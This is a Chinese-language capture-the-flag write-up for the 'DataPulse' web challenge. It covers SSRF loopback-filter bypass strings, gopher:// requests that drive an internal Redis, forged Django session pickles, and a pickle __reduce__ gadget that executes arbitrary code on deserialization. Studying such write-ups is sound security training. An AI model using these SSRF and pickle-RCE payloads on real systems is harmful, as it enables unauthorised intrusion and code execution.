# 1-4 DataPulse（WEB）— 完整 WP

## flag

```
DASCTF{62024490111382345374811086599901}
```

## 1. 信息收集

靶机 `nc/8000 -> 1.14.76.59:32210`，gunicorn + Django。

```
GET /                       → 首页（Login/Register）
GET /api/v1/status/         → {"service":"DataPulse Analytics Platform","version":"2.4.1"}
POST /register/             → {"message":"Registration successful","api_token":"..."}
                          → Set-Cookie: dp_session=<32位随机串>
GET /dashboard/             → 任务面板
```

面板接口：
- `POST /tasks/create/` `{name,type,parameters:{data},webhook_url}`
- `POST /tasks/<id>/retry-webhook/` `{url}` ← **SSRF**
- `GET /tasks/<id>/webhook-logs/`
- `GET /tasks/list/`

## 2. SSRF

`retry-webhook` 会服务端请求任意 URL 并回显 `response_body`。

过滤拦截 `localhost`、`127.0.0.1`、`[::1]`、`https`，但以下全部绕过：

```
http://127.1:8000/
http://2130706433:8000/        # 十进制 IP
http://0x7f000001:8000/        # 十六进制 IP
http://0:8000/
http://127.0.0.1.nip.io:8000/  # DNS
```

内网端口：仅 `8000`（自身）与 `6379`（Redis）开放。

## 3. gopher → Redis

`gopher://` 不在黑名单内（urllib 不接受，但应用实际用支持 gopher 的封装/requests 兼容层）：

```
gopher://127.1:6379/_*1%0d%0a$4%0d%0aINFO%0d%0a
→ $5096 # Server redis_version:7.0.15 ...
```

- DB0：`celery-task-meta-*`、`dp:heartbeat:*`
- **DB1：`:1:django.contrib.sessions.cache<sid>`，值是原始 pickle**：

```python
{'user_id': ..., 'role': 'analyst'}
```

## 4. 会话伪造

```redis
SELECT 1
SET :1:django.contrib.sessions.cache<sid> <pickle({'user_id':1,'role':'platform_admin'})>
```

带 `Cookie: dp_session=<sid>` 访问 `/api/v1/admin/`，返回：

```json
{"error":"Access denied",
 "detail":"Your IP is not in the admin whitelist...",
 "required_role":"platform_admin",
 "whitelist_check":"failed"}
```

→ 角色校验通过，只剩 IP 白名单（XFF/X-Real-IP/Forwarded 均无效）。

## 5. Pickle 反序列化 RCE

Django 缓存 session 后端直接 `pickle.loads` 会话值。构造：

```python
class E:
    def __reduce__(self):
        expr = "(exec(" + repr(CODE) + "), {'user_id':1,'role':'platform_admin'})[1]"
        return (eval, (expr,))
```

写入 DB1 后，`GET /dashboard/` 带该 cookie 触发反序列化 → 应用进程内代码执行。

## 6. 读 flag

容器根目录 `ls /`：

```
... |flag.txt|app|readflag ...
```

`/flag.txt` 无读权限，`/readflag` 为 setuid。RCE 内执行：

```python
subprocess.check_output("/readflag")
```

结果通过 socket 写入 Redis DB0 的 `pwn2`，再用 gopher SSRF 读回：

```
DASCTF{62024490111382345374811086599901}
```

## 复现脚本

`work/1-4/`：`recon*.sh`、`reg.sh`、`ssrf.sh`、`bypass.sh`、`redis.py`、`dbscan2.py`、
`sessdump.py`、`forge*.py`、`rce2.py`（RCE）、`rce3.py`（readflag）。
